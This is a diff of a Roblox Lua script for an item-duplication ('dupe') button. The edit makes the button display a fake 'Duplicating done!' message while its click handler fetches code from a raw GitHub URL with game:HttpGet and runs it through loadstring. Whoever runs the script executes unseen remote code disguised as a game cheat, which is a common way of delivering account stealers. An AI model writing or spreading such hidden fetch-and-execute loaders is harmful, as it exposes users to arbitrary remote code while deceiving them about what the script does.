@@ -200,8 +200,9 @@ end
 
 -- Button logic
 dupeBtn.MouseButton1Click:Connect(function()
-	showMessage("🌀 Duplicating the vibes...", Color3.fromRGB(120,170,255))
-end)pcall(function()
+	showMessage("Duplicating done!", Color3.fromRGB(120,170,255))
+end)
+  dupeBtn.MouseButton1Click:Connect(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"))()
 		end)
 
